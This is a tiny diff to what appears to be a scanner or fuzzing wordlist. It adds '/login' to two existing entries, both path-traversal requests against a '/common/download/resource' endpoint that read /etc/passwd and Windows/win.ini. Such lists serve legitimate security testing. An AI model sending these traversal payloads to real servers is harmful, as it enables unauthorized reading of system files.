@@ -1,2 +1,3 @@
 /common/download/resource?resource=/profile/../../../../etc/passwd
 /common/download/resource?resource=/profile/../../../../Windows/win.ini
+/login
